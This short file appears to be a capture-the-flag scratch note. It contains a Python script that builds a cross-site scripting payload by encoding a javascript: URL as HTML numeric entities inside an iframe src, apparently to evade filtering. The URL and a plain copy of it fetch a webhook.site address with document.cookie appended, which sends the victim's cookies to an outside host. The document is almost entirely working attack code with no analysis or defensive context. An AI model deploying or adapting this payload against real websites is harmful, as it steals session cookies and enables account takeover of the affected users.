https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d

content = "javascript:fetch('https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d'+document.cookie).then((response) => {return response.json();}).catch((error) => {console.log('no');})"
result = "<iframe src=&#"
for i in content:
    result+=str(ord(i))
    result+=";&#"
result = result[:-3]+"><iframe>"
print(result)




javascript:
    fetch('https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d?\
           flag='+document.cookie).then((response) => 
           {return response.json();}).catch((error) => 
           {console.log('no');})